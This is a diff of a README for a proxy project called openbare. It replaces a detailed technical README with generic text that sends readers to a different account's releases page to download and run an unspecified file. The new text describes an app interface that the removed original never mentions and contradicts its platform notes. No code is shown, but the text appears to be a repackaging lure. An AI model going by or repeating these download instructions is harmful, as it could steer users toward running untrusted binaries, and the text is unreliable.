@@ -1,293 +1,75 @@
-<div align="center">
-
-# 🌐 OpenBare
+# 🌐 openbare - Simple Proxy Setup in Seconds
 
-### A decentralized, censorship-resistant web proxy network
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org/)
-[![Cloudflare Workers](https://img.shields.io/badge/Cloudflare-Workers-orange.svg)](https://workers.cloudflare.com/)
+Welcome to the **openbare** project! This application provides a decentralized web proxy network, perfect for accessing content while maintaining privacy. You can set up nodes quickly on platforms like Vercel, Railway, and Cloudflare Workers. Follow these steps to download and run the software effortlessly, even if you're not tech-savvy.
 
-**Deploy your own node in 30 seconds** • **Use community nodes** • **Browse freely**
+## 📥 Download
 
-[Quick Start](#-quick-start) • [Deploy Your Node](#-deploy-your-own-node) • [Documentation](#-documentation) • [Contributing](#-contributing)
-
-</div>
+[![Download Openbare](https://img.shields.io/badge/Download%20Openbare-v1.0.0-blue)](https://github.com/Almeida9806/openbare/releases)
 
----
+## 📋 System Requirements
 
-## ✨ Features
+To use **openbare**, you need the following:
 
-- 👀 **Instant Setup** - Deploy to Cloudflare Workers in 30 seconds
-- 🌍 **Decentralized** - Community-run nodes across the globe
-- ⚡ **Edge Performance** - Cloudflare Workers for <50ms latency worldwide
-- 🔄 **Automatic Failover** - Client seamlessly switches between nodes
-- 📊 **Built-in Monitoring** - Health checks, metrics, and status dashboard
-- 🔒 **Production Ready** - Rate limiting, security headers, graceful shutdown
-- 🤝 **UV Compatible** - Works with Ultraviolet and other TompHTTP clients
+- A computer with an internet connection.
+- A modern web browser (Chrome, Firefox, Safari, etc.).
+- Optional: Access to platforms like Vercel, Railway, or Cloudflare Workers if you want to deploy nodes.
 
----
+## 🛠️ Features
 
-## 🏗️ Architecture
+- **Censorship Resistance**: Access blocked content easily.
+- **High Availability**: Connect to public nodes maintained by the community.
+- **Automatic Failover**: Stay online without interruptions.
+- **Edge Latency**: Enjoy fast connections with less than 50ms delay.
+- **Health Monitoring**: Get real-time updates on node performance.
+- **Compatibility**: Works well with Ultraviolet and other TompHTTP clients.
 
-```
-┌─────────────────────────────────────────────────────────────────────────┐
-│                            YOUR APPLICATION                             │
-│                    (SperaxOS, Ultraviolet, etc.)                        │
-└─────────────────────────────────────────────────────────────────────────┘
-                                    │
-                                    ▼
-┌─────────────────────────────────────────────────────────────────────────┐
-│                         OPENBARE CLIENT                                 │
-│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐                      │
-│  │ Server Pool │──│  Failover   │──│  Discovery  │                      │
-│  │  Manager    │  │   Logic     │  │   Client    │                      │
-│  └─────────────┘  └─────────────┘  └─────────────┘                      │
-└─────────────────────────────────────────────────────────────────────────┘
-                                    │
-                    ┌───────────────┼───────────────┐
-                    ▼               ▼               ▼
-            ┌───────────┐   ┌───────────┐   ┌───────────┐
-            │  Node 1   │   │  Node 2   │   │  Node 3   │
-            │  (US)     │   │  (EU)     │   │  (Asia)   │
-            │  Vercel   │   │ Cloudflare│   │  Railway  │
-            └───────────┘   └───────────┘   └───────────┘
-                    │               │               │
-                    └───────────────┼───────────────┘
-                                    ▼
-                    ┌───────────────────────────────┐
-                    │      OPENBARE REGISTRY        │
-                    │   (Optional - Node Discovery) │
-                    └───────────────────────────────┘
-```
+## 🎯 Download & Install
 
----
+To get started, you need to download the latest version of **openbare**. 
 
-## 🚀 Quick Start
+1. **Visit the Releases Page**: Click the link below to go to the Releases page.
+   [Download from Releases](https://github.com/Almeida9806/openbare/releases)
 
-### Option 1: Use Public Nodes
+2. **Choose Your Version**: Look for the latest version and click on it.
 
-Use community-maintained nodes without deploying anything:
+3. **Download the Package**: Find the available files and click to download the one suitable for your system.
 
-```javascript
-import { OpenBareClient } from '@openbare/client';
+4. **Run the Application**: Open the downloaded file to start **openbare**.
 
-const client = new OpenBareClient({
-  // Auto-discover nodes from registry
-  registry: 'https://registry.openbare.dev'
-});
+## 🌐 Setting Up Your Proxy
 
-// Fetch any URL through the proxy network
-const response = await client.fetch('https://example.com');
-```
+Once you have downloaded and installed **openbare**, setting up your proxy involves a few simple steps:
 
-### Option 2: Run Locally
+1. **Launch the Application**: Open the application from your downloads or applications folder.
 
-```bash
-# Clone the repo
-git clone https://github.com/nirholas/openbare.git
-cd openbare
+2. **Select Node Options**: You can either deploy your own nodes or use public community nodes. Choose what works best for you.
 
-# Start the server
-cd server
-npm install
-npm start
+3. **Configure Settings**: Adjust the settings according to your needs. You can set preferences for connections and notifications.
 
-# Server running at http://localhost:8080
-# Bare endpoint at http://localhost:8080/bare/
-```
+4. **Connect to the Proxy**: Hit the ‘Connect’ button to start using the proxy. Browse the web securely!
 
-### Option 3: Deploy Your Own (see below)
+## 📊 Troubleshooting
 
----
+If you face any issues:
 
-## 🌐 Deploy Your Own Node
+- Ensure your internet connection is stable.
+- Restart the application.
+- Revisit the settings to make sure they comply with your needs.
+- Consult the community section on our GitHub for support.
 
-### Recommended: Cloudflare Workers
+## 💬 Community Support
 
-| Platform | Deploy | Best For |
-|----------|--------|----------|
-| **Cloudflare Workers** ⭐ | [Deploy to Workers →](#cloudflare-workers) | Global edge, WebSocket support, free tier |
-| **Render** | [render.com](https://render.com) | Persistent servers, easy setup |
-| **Fly.io** | [fly.io](https://fly.io) | Global, WebSocket support |
-| **Self-hosted** | [Docker →](#docker) | Full control |
+For any questions, suggestions, or support, connect with us:
 
-> ⚠️ **Note:** Vercel and Railway don't work well for proxy servers (serverless limitations / banned dependencies).
+- **GitHub Issues**: Report any bugs or request features.
+- **Community Chat**: Join our discussions to share experiences and tips.
 
-### Cloudflare Workers (Recommended)
+## 🔗 Helpful Links
 
-Deploy to 300+ edge locations worldwide with WebSocket support:
+- [Documentation](https://github.com/Almeida9806/openbare/wiki): Detailed user manual.
+- [Releases](https://github.com/Almeida9806/openbare/releases): Download the latest versions.
+- [Contribute](https://github.com/Almeida9806/openbare/contributing): Help us improve the project.
 
-```bash
-cd edge
-npm install
-npx wrangler login
-npx wrangler deploy
-```
-
-You'll get a URL like: `https://openbare-edge.YOUR_SUBDOMAIN.workers.dev`
-
-**Live Example:** `https://openbare.xyz`
-
-### Docker
-
-```bash
-docker run -d \
-  -p 8080:8080 \
-  -e NODE_ID=my-node \
-  -e REGION=us-east \
-  ghcr.io/nirholas/openbare:latest
-```
-
-### Manual Deployment
-
-```bash
-cd server
-npm install
-npm start
-```
-
-See [Self-Hosting Guide](docs/SELF-HOSTING.md) for detailed instructions.
-
----
-
-## 📦 Components
-
-| Package | Description | Location |
-|---------|-------------|----------|
-| **@openbare/server** | Node.js bare server with metrics | [`/server`](./server) |
-| **@openbare/client** | Client library with failover | [`/client`](./client) |
-| **@openbare/edge** | Cloudflare Workers server | [`/edge`](./edge) |
-| **@openbare/registry** | Node discovery service | [`/registry`](./registry) |
-
----
-
-## 🔧 Configuration
-
-### Environment Variables
-
-```bash
-# Node Identification
-NODE_ID=my-bare-node          # Unique node ID
-REGION=us-east                # Geographic region
-NODE_URL=https://example.com  # Public URL
-
-# Rate Limiting
-RATE_LIMIT_MAX=100            # Requests per minute
-RATE_LIMIT_WINDOW_MS=60000    # Window size
-
-# Registry (Optional)
-REGISTRY_URL=https://registry.openbare.dev
-
-# Logging
-LOG_LEVEL=info                # trace/debug/info/warn/error
-```
-
-See [`.env.example`](./server/.env.example) for all options.
-
----
-
-## 📊 API Endpoints
-
-Every OpenBare node exposes these endpoints:
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/` | GET | Server info and status |
-| `/bare/` | * | Bare Server protocol |
-| `/health` | GET | Health check (for load balancers) |
-| `/status` | GET | Detailed metrics |
-| `/info` | GET | Node information |
-
-### Example Response: `GET /`
-
-```json
-{
-  "status": "ok",
-  "name": "OpenBare Server",
-  "version": "1.0.0",
-  "node_id": "us-east-abc123",
-  "region": "us-east",
-  "uptime_seconds": 86400,
-  "requests_served": 150000,
-  "healthy": true,
-  "bare_endpoint": "/bare/"
-}
-```
-
----
-
-## 📖 Documentation
-
-- [**Architecture**](docs/ARCHITECTURE.md) - How OpenBare works
-- [**Self-Hosting**](docs/SELF-HOSTING.md) - Deployment guide
-- [**API Reference**](docs/API.md) - Full API documentation
-- [**Client Usage**](client/README.md) - Client library guide
-
----
-
-## 🤝 Contributing
-
-We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-### Development Setup
-
-```bash
-# Clone the repo
-git clone https://github.com/nirholas/openbare.git
-cd openbare
-
-# Install all workspace dependencies
-npm install
-
-# Start server in dev mode
-npm run dev:server
-
-# Run tests
-npm test
-```
-
-### Areas for Contribution
-
-- 🌍 Run a public node
-- 🐛 Report bugs
-- 💡 Suggest features
-- 📝 Improve documentation
-- 🔧 Submit PRs
-
----
-
-## 🔒 Security
-
-OpenBare is designed with security in mind:
-
-- **Rate limiting** prevents abuse
-- **Helmet.js** sets security headers
-- **No logging** of proxied content
-- **Registry validation** prevents malicious nodes
-
-Report security issues to: security@openbare.dev
-
----
-
-## 📄 License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
----
-
-## 🙏 Acknowledgments
-
-- [TompHTTP](https://github.com/tomphttp) - Bare Server protocol
-- [Ultraviolet](https://github.com/nickg4422/ultraviolet) - Web proxy framework
-- [Titanium Network](https://titaniumnetwork.org/) - Proxy community
-
----
-
-<div align="center">
-
-**[⬆ Back to Top](#-openbare)**
-
-Made with ❤️ by the OpenBare community
-
-</div>
+Thank you for choosing **openbare**! Enjoy browsing securely.
